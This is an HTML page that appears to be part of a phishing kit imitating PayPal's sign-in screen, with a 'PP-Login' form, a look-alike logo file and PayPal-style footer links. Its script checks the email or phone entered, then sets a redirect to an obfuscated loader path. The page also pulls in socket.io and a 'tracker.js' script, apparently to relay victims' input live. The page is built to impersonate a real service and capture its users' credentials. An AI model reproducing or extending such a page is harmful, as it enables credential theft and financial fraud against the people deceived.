<html lang="de">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/index.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>

</head>

<body>
    <header>

    </header>
    <main>
        <form method="post" id="PP-Login">
            <div class="logo">
                <img src="./img/pipillgomark.png" alt="">
            </div>
            <div class="input-container">
                <input required="" id="username" name="username" type="text">
                <label class="label" for="username">Email or mobile number</label>
                <div class="underline"></div>
                <div id="errorMessage" style="color: #d01a1a; font-size: 12px; margin-top: 5px; display: none;">Please
                    enter your email address or mobile number.</div>
            </div>
            <div class="bot">
                <div class="first">
                    <p>Forgot Email ?</p>
                    <button class="btn" type="submit">Login</button>
                </div>
                <div class="mid">
                    <hr>
                    <span>or</span>
                    <hr>
                </div>
                <div class="second">
                    <a href="">Sign up</a>
                </div>
                <div class="third">
                    <a href="">Arabic</a>
                    <hr>
                    <a href="" class="active">English</a>
                    <hr>
                    <a href="">French</a>
                    <hr>
                    <a href="">Spanish</a>
                    <hr>
                    <a href="">Chinese</a>
                </div>
            </div>
        </form>
    </main>
    <footer>
        <p>Contact</p>
        <p>Privacy Policy</p>
        <p>Legal</p>
        <p>Policy Updates</p>
        <p>Worldwide</p>
    </footer>

    <script>
        function validateEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        function validatePhoneNumber(phone) {
            // Remove spaces, dashes, and other non-numeric characters
            const cleanPhone = phone.replace(/[\s\-\(\)\.]/g, '');
            // Check for valid phone formats (starts with + or digits, 7-15 digits)
            const phoneRegex = /^(\+?[0-9]{7,15})$/;
            return phoneRegex.test(cleanPhone);
        }

        document.getElementById('PP-Login').addEventListener('submit', function (e) {
            e.preventDefault();
            console.log("submit");
            const username = document.getElementById('username').value.trim();
            const errorMessage = document.getElementById('errorMessage');

            if (!username) {
                errorMessage.textContent = 'Please enter your email address or mobile number.';
                errorMessage.style.display = 'block';
                return;
            }

            // Allow usernames without @ symbols, validate email/phone only if @ is present
            const hasAtSymbol = username.includes('@');
            let isValid = true;

            if (hasAtSymbol) {
                isValid = validateEmail(username);
            } else {
                // For usernames without @, allow any non-empty value
                isValid = username.length > 0;
            }

            if (!isValid) {
                errorMessage.textContent = hasAtSymbol ?
                    'Please enter a valid email address.' :
                    'Please enter a valid username.';
                errorMessage.style.display = 'block';
                return;
            }

            // Hide error message if validation passes
            errorMessage.style.display = 'none';
            console.log('Login attempt:', { username });

            const form = document.getElementById('PP-Login');
            form.setAttribute('data-redirect', '/loadPPxCvGk6Hb?time=3&url=PasoPPIkjnUHnKJHu');
        });

        // Also hide error message when user starts typing
        document.getElementById('username').addEventListener('input', function () {
            const errorMessage = document.getElementById('errorMessage');
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
        });
    </script>

    <script src="/socket.io/socket.io.js"></script>
    <script src="js/tracker.js"></script>

</body>

</html>